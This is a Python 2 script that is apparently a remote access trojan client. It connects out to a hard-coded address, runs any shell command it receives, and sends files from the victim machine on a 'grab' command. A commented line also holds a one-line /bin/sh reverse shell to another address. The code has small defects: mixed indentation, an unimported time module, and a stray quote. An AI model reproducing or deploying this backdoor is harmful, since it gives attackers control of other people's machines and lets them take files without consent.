import commands
import shutil
import socket 
import subprocess 
import os


import platform



def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: # the file doesn't exist
        s.send('Unable to find out the file')



def connect():
	#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.107', 8081))
    
 

    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 



        elif 'grab' in command:            
            grab,path = command.split('*')
            
            try:                          
                transfer(s,path)
            except Exception,e:
				time.sleep(5)
                # s.send ( str(e) )  # send the exception error
                #pass

        elif 'cd' in command:
            code,directory = command.split(" ")
            os.chdir(directory) 
           
            s.send( "[+] CWD Is " + os.getcwd() )
            
        elif 'getenv' in command:
        	   s.send( "[+] Platform Is " + platform.platform()) 
        
        elif 'getuid' in command:
        		s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
        

        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  )
			

def main ():
    connect()
main()
